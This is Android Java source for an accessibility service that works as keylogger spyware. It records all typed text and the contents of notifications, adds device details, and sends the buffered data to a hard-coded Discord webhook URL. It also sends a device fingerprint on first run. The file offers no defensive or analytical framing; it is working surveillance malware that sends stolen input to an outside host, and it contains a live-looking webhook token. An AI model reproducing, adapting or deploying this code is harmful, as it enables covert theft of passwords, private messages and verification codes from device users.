package com;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;

public class MyAccessibilityService extends AccessibilityService {

    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1215008300521889874/9OkkdCHwtk1C81qx5dyV3ztHIfIVOIP1yXKIUmnKYxKUWrND4yQnmiYpuqkD4oYuMdPj";
    private static final int MAX_BUFFER_SIZE = 25;

    private final StringBuilder currentKeyEvents = new StringBuilder();
    private int keyEventCount = 0;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                handleTextChangedEvent(event);
                break;
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                handleNotificationChangedEvent(event);
                break;
            default:
                // Handle other event types if needed
        }
    }

    private void handleTextChangedEvent(AccessibilityEvent event) {
        // Handle text changed events
        List<CharSequence> textList = event.getText();
        for (CharSequence text : textList) {
            String newText = text.toString();
            int newKeyEventCount = countKeyEvents(newText);

            if (newKeyEventCount > keyEventCount) {
                currentKeyEvents.append(newText.substring(keyEventCount));

                if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                    sendBufferToDiscordAndClear();
                }
            }

            keyEventCount = newKeyEventCount;
        }
    }

    private void handleNotificationChangedEvent(AccessibilityEvent event) {
        StringBuilder notificationTextBuilder = new StringBuilder();
        for (CharSequence text : event.getText()) {
            notificationTextBuilder.append(text);
        }
        CharSequence notificationText = notificationTextBuilder.toString();

        if (!notificationText.toString().isEmpty()) {
            // Append notification text to the buffer along with log message
            currentKeyEvents.append("Notification: ").append(notificationText).append("\n");

            // Check buffer size
            if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                sendBufferToDiscordAndClear();
            }
        }
    }

    private int countKeyEvents(String text) {
        // Count the number of key events (assuming each character is a key event)
        return text.length();
    }

    private void sendBufferToDiscordAndClear() {
        String log = currentKeyEvents.toString();

        // Append MANUFACTURER and MODEL to the log message
        String deviceInfo = "MANUFACTURER: " + Build.MANUFACTURER + "\n";
        deviceInfo += "MODEL: " + Build.MODEL + "\n";

        log = deviceInfo + log;

        new MessageSender().execute(log);
        currentKeyEvents.setLength(0); // Clear the builder
    }


    @Override
    public void onInterrupt() {
        // Handle interruption
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);

        // Check if it's the first run
        SharedPreferences prefs = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE);
        boolean isFirstRun = prefs.getBoolean("FirstRun", true);

        if (isFirstRun) {
            // Gather device details
            String deviceDetails = getSYSInfo();

            // Send the gathered information to Discord
            currentKeyEvents.append(deviceDetails).append("\n");
            sendBufferToDiscordAndClear();
            SharedPreferences.Editor editor = prefs.edit();
            editor.putBoolean("FirstRun", false);
            editor.apply();
        }
    }

    private String getSYSInfo() {
        return "MANUFACTURER : " + Build.MANUFACTURER + "\n" +
                "MODEL : " + Build.MODEL + "\n" +
                "PRODUCT : " + Build.PRODUCT + "\n" +
                "VERSION.RELEASE : " + Build.VERSION.RELEASE + "\n" +
                "VERSION.INCREMENTAL : " + Build.VERSION.INCREMENTAL + "\n" +
                "VERSION.SDK.NUMBER : " + Build.VERSION.SDK_INT + "\n" +
                "BOARD : " + Build.BOARD + "\n";
    }

    private static class MessageSender extends AsyncTask<String, Void, Void> {
        private static final String TAG = "MessageSender";

        @Override
        protected Void doInBackground(String... strings) {
            String log = strings[0];

            try {
                URL url = new URL(WEBHOOK_URL);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setDoOutput(true);

                // Modify log message to ensure "Notification" line is always on its own line
                log = log.replace("Notification:", "\nNotification:");

                JSONObject messageJSON = new JSONObject();
                messageJSON.put("content", "```\n" + log + "\n```");
                OutputStream os = connection.getOutputStream();
                os.write(messageJSON.toString().getBytes(StandardCharsets.UTF_8));
                os.flush();
                os.close();

                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.d(TAG, "Message sent to Discord channel.");
                } else {
                    Log.e(TAG, "Failed to send message to Discord channel. Response code: " + responseCode);
                }
                connection.disconnect();
            } catch (JSONException e) {
                Log.e(TAG, "Failed to create JSON object: " + e.getMessage());
            } catch (Exception e) {
                Log.e(TAG, "Failed to send message to Discord channel: " + e.getMessage());
            }
            return null;
        }
    }
}
